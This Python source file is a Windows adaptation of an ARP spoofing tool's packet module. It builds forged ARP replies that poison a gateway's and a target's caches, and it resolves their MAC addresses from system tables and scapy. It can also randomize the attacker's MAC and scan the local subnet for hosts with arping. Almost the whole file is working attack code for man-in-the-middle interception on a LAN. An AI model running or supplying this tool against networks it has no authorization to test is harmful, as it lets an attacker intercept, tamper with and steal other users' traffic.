#!/usr/bin/env python3
# Windows-compatible replacement for packets.py
# Based on EONRaider/Arp-Spoofer original with AF_PACKET removed
# Requires: scapy (for get_if_hwaddr and getmacbyip) and running with Npcap+Administrator for active queries

__author__ = 'Adapted from EONRaider'

from csv import DictReader
from random import choices
from socket import inet_ntop, AF_INET, gethostbyaddr
from struct import pack
from types import SimpleNamespace
from ipaddress import ip_interface, ip_address, IPv4Network
import re
import subprocess
import sys
import threading

# scapy helpers (used only for interface MAC lookup / getmacbyip fallback)
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    conf,
    arping,
    get_if_addr,
)

try:
    from scapy.arch.windows import get_windows_if_list
except ImportError:
    get_windows_if_list = None

from protocols import ARP, Ethernet, Packet

MAC_REGEX = re.compile(r'^[0-9a-fA-F:]{17}$')


class ARPAttackPackets(object):

    ARP_ETHERTYPE = 0x0806  # Ethernet type for ARP

    def __init__(self, attacker_mac: str, gateway_ip: str, gateway_mac: str,
                 target_ip: str, target_mac: str):
        self.attacker_mac = attacker_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.payloads = (self.payload_to_gateway, self.payload_to_target)

    def __iter__(self):
        yield from self.payloads

    @property
    def payload_to_gateway(self):
        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
                                  eth=self.ARP_ETHERTYPE),
                         ARP(sha=self.attacker_mac, spa=self.target_ip,
                             tha=self.gateway_mac, tpa=self.gateway_ip))
        return gateway.payload

    @property
    def payload_to_target(self):
        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
                                 eth=self.ARP_ETHERTYPE),
                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
                            tha=self.target_mac, tpa=self.target_ip))
        return target.payload


class ARPSetupProxy(object):
    """
    Proxy class adapted for Windows:

    - Avoids AF_PACKET / PF_PACKET usage.
    - Uses Windows `arp -a` and `route print` parsing as best-effort lookups.
    - Uses scapy.get_if_hwaddr and scapy.getmacbyip as fallbacks.
    """

    def __init__(self, interface: str, attacker_mac: str, gateway_mac: str,
                 gateway_ip: str, target_mac: str, target_ip: str,
                 disassociate: bool):
        self.__target_ip = target_ip
        self.__disassociate = disassociate
        self.__net_tables = NetworkingTables()
        self.__gateway_route = self.__get_gateway_route()
        self.interface = self.__set_interface(interface)
        self.__attacker_mac = self.__set_attacker_mac(attacker_mac)
        self.__gateway_ip = self.__set_gateway_ip(gateway_ip)
        self.__gateway_mac = self.__set_gateway_mac(gateway_mac)
        self.__target_mac = self.__set_target_mac(target_mac)
        self.packets = ARPAttackPackets(self.__attacker_mac,
                                        self.__gateway_ip,
                                        self.__gateway_mac,
                                        self.__target_ip,
                                        self.__target_mac)

    def __get_gateway_route(self):
        """
        Returns a SimpleNamespace with keys: interface, gateway
        If running on Windows, parse 'route print' to find default route.
        Otherwise, rely on existing table (left for compatibility).
        """
        # If gateway_ip supplied explicitly later we won't rely on this, but we need a fallback interface
        try:
            # Try to parse platform-specific routing info
            rt = next(self.__net_tables.routing_table)
            # the routing table generator yields dicts; try to find the line with flags == default (Linux) first
            # If route generator yields Windows-style rows, it will still be okay.
            # Prefer explicit default destination '0.0.0.0' when present.
            # Build fallback structure similar to original (interface and gateway fields)
            # If we find a row with destination '0.0.0.0' use that.
            # However NetworkingTables.routing_table returns generator; iterate through it to find meaningful entry.
        except StopIteration:
            pass

        # Ask NetworkingTables to provide a best-effort default gateway (Windows implementation)
        gw_entry = self.__net_tables.get_default_route()
        if gw_entry:
            return gw_entry
        raise SystemExit('[!] Unable to find a usable route to the default gateway. '
                         'Please specify an interface or gateway IP manually with the -i / -G args.')

    def __set_interface(self, interface: str) -> str:
        if interface is not None:
            return interface
        return self.__gateway_route.interface

    def __set_gateway_ip(self, gateway_ip: str) -> str:
        if gateway_ip is not None:
            return gateway_ip
        # On Windows the routing parser returns dotted-decimal already
        return self.__gateway_route.gateway

    def __set_gateway_mac(self, gateway_mac: str) -> str:
        if gateway_mac is not None:
            return gateway_mac
        # Try arp table lookup for the gateway IP
        for entry in self.__net_tables.arp_table:
            if entry['ip_address'] == self.__gateway_ip:
                return entry['hw_address']
        # fallback: try scapy getmacbyip
        try:
            mac = getmacbyip(self.__gateway_ip)
            if mac:
                return mac
        except Exception:
            pass
        raise SystemExit('[!] Unable to determine gateway MAC address. Provide it with -g.')

    def __set_target_mac(self, mac_addr: str) -> str:
        if mac_addr is not None:
            return mac_addr
        # Check ARP table first
        for entry in self.__net_tables.arp_table:
            if entry['ip_address'] == self.__target_ip:
                return entry['hw_address']
        # Fallback: try scapy getmacbyip (sends ARP and waits)
        try:
            mac = getmacbyip(self.__target_ip, timeout=2, verbose=False)
            if mac:
                return mac
        except Exception:
            pass
        # Last resort: attempt to stimulate ARP by sending UDP probe using system ping (best-effort)
        try:
            # On Windows, 'ping -n 1 <ip>' may populate ARP table
            subprocess.run(['ping', '-n', '1', self.__target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Re-check arp table
            for entry in self.__net_tables.arp_table:
                if entry['ip_address'] == self.__target_ip:
                    return entry['hw_address']
        except Exception:
            pass

        raise SystemExit('[!] Unable to determine target MAC address. Provide it with -t.')

    def __set_attacker_mac(self, mac_addr: str) -> str:
        if mac_addr is not None:
            return mac_addr
        if self.__disassociate is True:
            return self.__randomize_mac_addr()
        # Use scapy's get_if_hwaddr as a cross-platform way to obtain interface MAC
        try:
            # conf.iface can be set later; ensure we pass the interface string
            mac = get_if_hwaddr(self.interface)
            return mac.lower()
        except Exception as exc:
            raise SystemExit(f'[!] Unable to determine attacker MAC for interface {self.interface}: {exc}')

    @staticmethod
    def __randomize_mac_addr() -> str:
        hex_values = '0123456789ABCDEF'
        return ':'.join(''.join(choices(hex_values, k=2)) for _ in range(6))

    @staticmethod
    def __bytes_to_mac_addr(addr: bytes) -> str:
        return ':'.join(format(octet, '02x') for octet in addr)


class NetworkingTables(object):
    """
    Windows-friendly networking table access:
    - arp_table: parses the output of 'arp -a'
    - routing_table: yields rows parsed from 'route print' (best effort)
    - get_default_route(): returns a SimpleNamespace(interface=<ifname>, gateway=<ip>)
    """

    @staticmethod
    def __parse_windows_arp(output: str):
        """
        Parses Windows 'arp -a' output and yields dicts with ip_address, hw_address, type.
        Example arp -a lines:
          Internet Address      Physical Address      Type
          192.168.1.1           00-11-22-33-44-55     dynamic
        """
        lines = output.splitlines()
        for line in lines:
            line = line.strip()
            # match lines like: 192.168.1.1          00-11-22-33-44-55     dynamic
            parts = re.split(r'\s+', line)
            if len(parts) >= 3 and re.match(r'^\d+\.\d+\.\d+\.\d+$', parts[0]):
                ip = parts[0]
                hw = parts[1].replace('-', ':').lower()
                yield {'ip_address': ip, 'hw_address': hw, 'type': parts[2].lower()}

    @property
    def arp_table(self):
        # Attempt platform specific method first
        if sys.platform.startswith('win'):
            try:
                res = subprocess.run(['arp', '-a'], capture_output=True, text=True, check=False)
                return self.__parse_windows_arp(res.stdout)
            except Exception:
                # fallback to an empty generator
                return iter(())
        else:
            # Preserve original Linux behavior: parse /proc/net/arp
            headers = ('ip_address', 'hw_type', 'flags', 'hw_address', 'mask', 'device')
            return NetworkingTables.__parse_networking_table('/proc/net/arp', headers, ' ')

    @staticmethod
    def __parse_networking_table(path: str, header: tuple, delimiter: str):
        with open(path, 'r', encoding='utf_8') as table:
            settings = DictReader(table, fieldnames=header, skipinitialspace=True, delimiter=delimiter)
            next(settings, None)  # Skip header line
            yield from (line for line in settings)

    @property
    def routing_table(self):
        # On Windows, parse 'route print' (best effort); otherwise parse /proc/net/route
        if sys.platform.startswith('win'):
            try:
                res = subprocess.run(['route', 'print', '-4'], capture_output=True, text=True, check=False)
                return self.__parse_windows_route(res.stdout)
            except Exception:
                return iter(())
        else:
            headers = ('interface', 'destination', 'gateway', 'flags', 'ref_cnt', 'use', 'metric', 'mask', 'mtu', 'window', 'irtt')
            return NetworkingTables.__parse_networking_table('/proc/net/route', headers, '\t')

    def __parse_windows_route(self, output: str):
        """
        Parse 'route print' output to extract IPv4 routes.
        This is a best-effort parser; it yields dicts with interface and gateway among other fields.
        """
        lines = output.splitlines()
        in_ipv4_table = False
        # The IPv4 Route Table header line usually contains "IPv4 Route Table"
        for i, line in enumerate(lines):
            if 'IPv4 Route Table' in line:
                in_ipv4_table = True
                # skip ahead to routing lines (there are headers / blank lines)
                continue
            if not in_ipv4_table:
                continue
            # route entries usually appear after a header like:
            # ===========================================================================
            # Interface List
            # ===========================================================================
            # ... then the IPv4 Route Table sections with header lines
            # We'll look for lines that start with whitespace + destination ip
            line = line.strip()
            if not line:
                continue
            parts = re.split(r'\s+', line)
            # Expect lines like: Network Destination  Netmask          Gateway       Interface  Metric
            # Actual routes lines have at least 5 columns; detect IPv4 route lines by first token being an IP or 0.0.0.0
            if len(parts) >= 5 and re.match(r'^\d+\.\d+\.\d+\.\d+$', parts[0]):
                dest, mask, gateway, interface = parts[0], parts[1], parts[2], parts[3]
                yield {'interface': interface, 'destination': dest, 'gateway': gateway, 'mask': mask}
            # continue parsing

    def get_default_route(self):
        """
        Return a SimpleNamespace(interface=<ifname>, gateway=<ip>) for the default route.
        On Windows parse the routing table for destination 0.0.0.0. On Linux, use original logic.
        """
        if sys.platform.startswith('win'):
            for row in self.routing_table:
                try:
                    if row.get('destination') == '0.0.0.0' or row.get('destination') == '0.0.0.0':
                        iface = row.get('interface')
                        gw = row.get('gateway')
                        # interface may be an interface IP rather than name; try to resolve name via scapy conf.route
                        # attempt to find interface name through scapy's route info if needed
                        if iface and re.match(r'^\d+\.\d+\.\d+\.\d+$', iface):
                            # scapy conf.route.route returns (src, gw, iface_name) for a dest; use gateway to find iface
                            try:
                                _, _, iface_name = conf.route.route('0.0.0.0')
                                if iface_name:
                                    iface = iface_name
                            except Exception as e:
                                # Handle any exceptions from conf.route.route
                                print(f"Error while resolving interface: {e}")
                                pass  # Optionally handle the exception here
                        return SimpleNamespace(interface=iface, gateway=gw)
                except Exception as e:
                    print(f"Error while processing route row: {e}")
                    continue  # This will allow the loop to continue even if there's an error

        else:
            # Linux: original route parsing based on /proc/net/route
            for route in self.routing_table:
                if int(route['flags']) == 0x0003:
                    # convert gateway hex to dotted-decimal
                    gw_ip = inet_ntop(AF_INET, pack("=L", int(route['gateway'], 16)))
                    return SimpleNamespace(interface=route['interface'], gateway=gw_ip)

        return None


def resolve_hostname(ip_address: str):
    try:
        hostname, _, _ = gethostbyaddr(ip_address)
        return hostname
    except Exception:
        return None


def get_default_interface():
    tables = NetworkingTables()
    route = tables.get_default_route()
    if not route:
        return None
    iface = route.interface
    if iface and re.match(r'^\d+\.\d+\.\d+\.\d+$', iface):
        resolved = None
        if get_windows_if_list:
            try:
                for entry in get_windows_if_list():
                    ips = entry.get('ips') or entry.get('ipv4') or []
                    if not ips:
                        legacy_ip = entry.get('ip')
                        if legacy_ip:
                            ips = [legacy_ip]
                    if isinstance(ips, str):
                        ips = [ips]
                    ips = [str(ip) for ip in ips if ip]
                    if iface in ips:
                        resolved = entry.get('name') or entry.get('description')
                        break
            except Exception:
                resolved = None
        if not resolved:
            try:
                _, _, iface_name = conf.route.route(route.gateway or '0.0.0.0')
                if iface_name:
                    resolved = iface_name
            except Exception:
                resolved = None
        if resolved:
            return resolved
    return iface


def discover_hosts(*, interface: str, cidr: str = None, timeout: int = 2):
    """
    Discover hosts reachable on the local network segment.
    Returns a list of dicts with keys: ip, mac, hostname.
    """
    results = {}

    def _register_entry(ip: str, mac: str):
        if mac in ('ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00'):
            return
        entry = results.setdefault(ip, {'ip': ip, 'mac': None, 'hostname': None, 'sources': set()})
        if mac:
            entry['mac'] = mac.lower()
        entry['sources'].add('passive')

    tables = NetworkingTables()
    for entry in tables.arp_table:
        _register_entry(entry['ip_address'], entry['hw_address'])

    network_cidr = cidr
    if not network_cidr:
        iface_addr = None
        netmask = None
        try:
            iface_addr = get_if_addr(interface)
        except Exception:
            iface_addr = None

        iface_obj = None
        try:
            iface_obj = conf.ifaces[interface]
        except Exception:
            try:
                iface_obj = conf.ifaces.dev_from_name(interface)
            except Exception:
                iface_obj = None

        if iface_obj:
            netmask = getattr(iface_obj, 'netmask', None)
            if not iface_addr:
                iface_addr = getattr(iface_obj, 'ip', None)

        if not netmask and get_windows_if_list:
            try:
                interface_lower = interface.lower() if isinstance(interface, str) else ''
                for entry in get_windows_if_list():
                    name = (entry.get('name') or '').lower()
                    description = (entry.get('description') or '').lower()
                    ips = entry.get('ips') or entry.get('ipv4') or []
                    if isinstance(ips, str):
                        ips = [ips]
                    legacy_ip = entry.get('ip')
                    if legacy_ip:
                        ips = list(ips) + [legacy_ip]
                    ips = [str(ip) for ip in ips if ip]

                    match_by_name = interface_lower in (name, description)
                    match_by_ip = isinstance(interface, str) and interface in ips

                    if match_by_name or match_by_ip:
                        win_netmask = entry.get('netmask') or entry.get('mask')
                        if win_netmask:
                            netmask = win_netmask
                        if not iface_addr:
                            if ips:
                                iface_addr = next((ip for ip in ips if isinstance(ip, str)), None)
                        break
            except Exception:
                netmask = None

        if iface_addr and netmask:
            try:
                network_cidr = str(ip_interface(f"{iface_addr}/{netmask}").network)
            except ValueError:
                network_cidr = None

    if network_cidr:
        def _active_scan():
            try:
                ans, _ = arping(network_cidr, iface=interface, timeout=timeout, verbose=False)
                for _, pkt in ans:
                    ip = pkt.psrc
                    mac = pkt.hwsrc
                    entry = results.setdefault(ip, {'ip': ip, 'mac': None, 'hostname': None, 'sources': set()})
                    entry['mac'] = mac.lower()
                    entry['sources'].add('active')
            except Exception:
                pass

        scan_thread = threading.Thread(target=_active_scan, name='HostDiscover', daemon=True)
        scan_thread.start()
        scan_thread.join(timeout + 1)

    for entry in results.values():
        if not entry['hostname']:
            entry['hostname'] = resolve_hostname(entry['ip'])

    network_obj = None
    if network_cidr:
        try:
            network_obj = IPv4Network(network_cidr, strict=False)
        except ValueError:
            network_obj = None

    hosts = []
    for ip, info in sorted(results.items()):
        try:
            addr = ip_address(ip)
        except ValueError:
            continue
        if addr.is_multicast or addr.is_unspecified or addr.is_loopback or addr.is_reserved:
            continue
        if network_obj:
            if addr not in network_obj or addr == network_obj.network_address or addr == network_obj.broadcast_address:
                continue
        hosts.append({
            'ip': ip,
            'mac': info.get('mac'),
            'hostname': info.get('hostname'),
            'sources': ','.join(sorted(info['sources'])) if info.get('sources') else '',
        })
    return hosts

